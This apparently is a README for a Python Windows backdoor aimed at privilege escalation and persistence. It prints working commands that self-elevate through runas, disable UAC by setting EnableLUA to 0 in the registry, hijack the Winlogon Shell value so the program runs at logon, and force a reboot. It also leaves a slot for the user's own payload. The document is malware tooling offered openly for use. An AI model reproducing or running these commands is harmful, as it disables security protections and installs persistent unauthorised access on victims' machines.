# This is a simple backdoor
It has no C2C payload.
<br>Just for Privilege Escalation and Persistence<br> <br>Please See below.
<br><br>
### Functions
* Auto run as admin

<code>shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)</code>
<br><br>
* de UAC Mode
 
<code>os.system('reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')</code>
<br><br>
* Add persistence

<code>os.system(f'reg.exe ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Shell /t REG_SZ /d "explorer.exe, {ROOT_PATH}\\{PROG_NAME}"')</code>
<br><br>
* Restart Computer for deUAC

<code>os.system('shutdown /r /f /t 1')</code>
<br><br>

* And

<code>With your Payload</code>
<br><br>
### References
https://attack.mitre.org/techniques/T1547/004/